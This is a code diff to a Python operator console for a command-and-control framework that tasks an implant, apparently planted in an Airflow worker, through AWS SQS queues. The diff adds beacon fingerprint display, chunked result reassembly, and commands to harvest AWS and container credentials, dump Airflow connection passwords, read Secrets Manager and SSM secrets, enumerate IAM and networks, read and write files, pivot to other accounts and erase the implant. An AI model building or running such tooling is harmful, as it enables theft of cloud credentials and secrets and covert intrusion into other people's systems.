@@ -97,7 +97,7 @@ def receive_results(
     wait_seconds: int = 10,
     max_results: int = 10,
 ) -> list:
-    """Poll the results queue for implant output."""
+    """Poll the results queue for implant output, reassembling chunked messages."""
     sqs = get_sqs_client(attacker.region, attacker.profile)
     results_url = attacker.queue_url(results_queue)
 
@@ -108,19 +108,70 @@ def receive_results(
         delete_after=True,
     )
 
+    # Collect chunks for reassembly
+    chunks = {}  # chunk_id -> {index: body_dict, ...}
     decoded = []
+
     for msg in messages:
         try:
             body = json.loads(msg["Body"])
-            result = {
-                "command": body.get("command", "unknown"),
-                "return_code": body.get("return_code", -1),
-                "stdout": base64.b64decode(body.get("stdout", "")).decode("utf-8", errors="replace"),
-                "stderr": base64.b64decode(body.get("stderr", "")).decode("utf-8", errors="replace"),
-            }
         except (json.JSONDecodeError, KeyError):
-            result = {"raw": msg["Body"]}
+            decoded.append({"raw": msg["Body"]})
+            continue
+
+        # Beacon messages
+        if body.get("type") == "beacon":
+            decoded.append({"beacon": body})
+            continue
+
+        # Chunked results
+        if "chunk_id" in body and "total_chunks" in body:
+            cid = body["chunk_id"]
+            idx = body.get("chunk_index", 0)
+            total = body["total_chunks"]
+            if cid not in chunks:
+                chunks[cid] = {"total": total, "meta": body, "parts": {}}
+            chunks[cid]["parts"][idx] = base64.b64decode(
+                body.get("stdout", "")
+            ).decode("utf-8", errors="replace")
+            continue
+
+        # Normal result
+        result = {
+            "command": body.get("command", "unknown"),
+            "return_code": body.get("return_code", -1),
+            "stdout": base64.b64decode(body.get("stdout", "")).decode("utf-8", errors="replace"),
+            "stderr": base64.b64decode(body.get("stderr", "")).decode("utf-8", errors="replace"),
+            "hostname": body.get("hostname", ""),
+            "timestamp": body.get("timestamp", ""),
+        }
         decoded.append(result)
+
+    # Reassemble completed chunks
+    for cid, chunk_info in chunks.items():
+        total = chunk_info["total"]
+        parts = chunk_info["parts"]
+        meta = chunk_info["meta"]
+        if len(parts) == total:
+            combined = "".join(parts[i] for i in sorted(parts.keys()))
+            decoded.append({
+                "command": meta.get("command", "unknown"),
+                "return_code": meta.get("return_code", 0),
+                "stdout": combined,
+                "stderr": "",
+                "hostname": meta.get("hostname", ""),
+                "timestamp": meta.get("timestamp", ""),
+                "reassembled_chunks": total,
+            })
+        else:
+            decoded.append({
+                "command": meta.get("command", "unknown"),
+                "return_code": -1,
+                "stdout": f"[incomplete: {len(parts)}/{total} chunks received]",
+                "stderr": "",
+                "hostname": meta.get("hostname", ""),
+                "timestamp": meta.get("timestamp", ""),
+            })
 
     return decoded
 
@@ -131,12 +182,40 @@ def _display_result(result: dict) -> None:
         print(f"  Raw response: {result['raw']}")
         return
 
+    if "beacon" in result:
+        beacon = result["beacon"]
+        fp = beacon.get("fingerprint", {})
+        print(f"\n  {'='*60}")
+        print(f"  BEACON from {fp.get('hostname', '?')} @ {beacon.get('timestamp', '?')}")
+        print(f"  {'='*60}")
+        print(f"    User:     {fp.get('user', '?')}")
+        print(f"    Platform: {fp.get('platform', '?')}")
+        print(f"    Python:   {fp.get('python', '?')[:60]}")
+        print(f"    PID:      {fp.get('pid', '?')}")
+        print(f"    CWD:      {fp.get('cwd', '?')}")
+        builtins = beacon.get("builtins", [])
+        if builtins:
+            print(f"    Modules:  {', '.join(builtins)}")
+        print(f"  {'='*60}\n")
+        return
+
     cmd = result.get("command", "?")
     rc = result.get("return_code", -1)
     stdout = result.get("stdout", "")
     stderr = result.get("stderr", "")
+    hostname = result.get("hostname", "")
+    timestamp = result.get("timestamp", "")
+    chunks = result.get("reassembled_chunks", 0)
 
-    print(f"\n  --- Result for: {cmd} (rc={rc}) ---")
+    header = f"Result for: {cmd[:80]} (rc={rc})"
+    if hostname:
+        header += f" [{hostname}]"
+    if timestamp:
+        header += f" @ {timestamp}"
+    if chunks:
+        header += f" ({chunks} chunks reassembled)"
+
+    print(f"\n  --- {header} ---")
     if stdout:
         for line in stdout.splitlines():
             print(f"  | {line}")
@@ -162,23 +241,39 @@ def operator_console(
     print_info(f"Command queue:  {attacker.queue_url(cmd_queue)}")
     print_info(f"Results queue:  {attacker.queue_url(results_queue)}")
     print()
-    print("  Commands:")
-    print("    <any shell command>  - Send to implant for execution")
-    print("    !results             - Poll for pending results")
-    print("    !airflow-conns       - Retrieve Airflow connections via implant")
-    print("    !env                 - Dump environment variables via implant")
-    print("    !s3-list             - List accessible S3 buckets via implant")
-    print("    !iam-whoami          - Get caller identity via implant")
-    print("    !quit                - Exit the operator console")
+    print("  Shell Commands:")
+    print("    <any command>         - Execute shell command on implant")
+    print("    python:<code>         - Execute inline Python on implant")
+    print()
+    print("  Built-in Modules (executed natively in the implant):")
+    print("    !harvest-creds        - Harvest AWS creds, IMDS, env vars, container creds")
+    print("    !airflow-dump         - Dump connections (with passwords), variables, pools")
+    print("    !s3-recon             - Enumerate S3 buckets, sample objects, read policies")
+    print("    !secrets              - List & read Secrets Manager secrets")
+    print("    !ssm-params           - List & read SSM Parameter Store (with decryption)")
+    print("    !iam-enum             - Enumerate role, attached/inline policies")
+    print("    !network-recon        - Network interfaces, routes, VPCs, subnets, SGs, IMDS")
+    print("    !self-destruct        - Remove the implant DAG and cached .pyc files")
+    print()
+    print("  File Operations:")
+    print("    !read-file <path>     - Read a file from the worker filesystem")
+    print("    !write-file <p> <b64> - Write base64 content to a file on the worker")
+    print()
+    print("  Advanced:")
+    print("    !pivot <acct> <queue> <msg> - Send a message to another account's queue")
+    print("    !multi                - Send multiple commands (newline-separated, end with empty line)")
+    print()
+    print("  Console:")
+    print("    !results              - Poll for pending results")
+    print("    !drain                - Drain all pending results (keep polling until empty)")
+    print("    !help                 - Show this help")
+    print("    !quit                 - Exit the operator console")
     print()
 
-    # Built-in compound commands
-    MACROS = {
-        "!airflow-conns": "python3 -c \"from airflow.models import Connection; from airflow.utils.session import create_session; "
-                          "ses=create_session().__enter__(); [print(f'{c.conn_id}: {c.get_uri()}') for c in ses.query(Connection).all()]\"",
-        "!env": "env | sort",
-        "!s3-list": "python3 -c \"import boto3; s3=boto3.client('s3'); [print(b['Name']) for b in s3.list_buckets().get('Buckets',[])]\"",
-        "!iam-whoami": "python3 -c \"import boto3,json; print(json.dumps(boto3.client('sts').get_caller_identity(), indent=2, default=str))\"",
+    # Commands that are sent directly to the implant (implant has native handlers)
+    IMPLANT_BUILTINS = {
+        "!harvest-creds", "!airflow-dump", "!s3-recon", "!secrets",
+        "!ssm-params", "!iam-enum", "!network-recon", "!self-destruct",
     }
 
     while True:
@@ -196,6 +291,11 @@ def operator_console(
             print_info("Exiting operator console.")
             break
 
+        if user_input == "!help":
+            operator_console.__doc__ and None  # re-print help
+            print("  Type any command above or a shell command to send to the implant.")
+            continue
+
         if user_input == "!results":
             print_info("Polling for results...")
             results = receive_results(attacker, results_queue, wait_seconds=5)
@@ -206,10 +306,55 @@ def operator_console(
                 print_info("No results available.")
             continue
 
-        # Resolve macros
-        actual_command = MACROS.get(user_input, user_input)
+        if user_input == "!drain":
+            print_info("Draining all pending results...")
+            total = 0
+            while True:
+                results = receive_results(attacker, results_queue, wait_seconds=3, max_results=10)
+                if not results:
+                    break
+                for r in results:
+                    _display_result(r)
+                total += len(results)
+            print_info(f"Drained {total} result(s).")
+            continue
 
-        print_info(f"Sending command: {actual_command[:80]}{'...' if len(actual_command) > 80 else ''}")
+        # Multi-command mode: collect lines until empty line
+        if user_input == "!multi":
+            print_info("Enter commands one per line. Empty line to send:")
+            lines = []
+            while True:
+                try:
+                    line = input("  c2:multi> ")
+                except (EOFError, KeyboardInterrupt):
+                    break
+                if not line.strip():
+                    break
+                lines.append(line)
+            if not lines:
+                print_info("No commands entered.")
+                continue
+            actual_command = "!multi\n" + "\n".join(lines)
+            print_info(f"Sending {len(lines)} command(s) as multi-command batch...")
+            msg_id = send_command(attacker, actual_command, cmd_queue)
+            print_success(f"Multi-command queued (MessageId: {msg_id})")
+            print_info("Waiting for results...")
+            time.sleep(3)
+            results = receive_results(attacker, results_queue, wait_seconds=15)
+            if results:
+                for r in results:
+                    _display_result(r)
+            else:
+                print_info("No results yet. Try '!results' later.")
+            continue
+
+        # Implant builtins and file/pivot commands are sent as-is
+        actual_command = user_input
+
+        display_cmd = actual_command[:100]
+        if len(actual_command) > 100:
+            display_cmd += "..."
+        print_info(f"Sending: {display_cmd}")
         msg_id = send_command(attacker, actual_command, cmd_queue)
         print_success(f"Command queued (MessageId: {msg_id})")
 
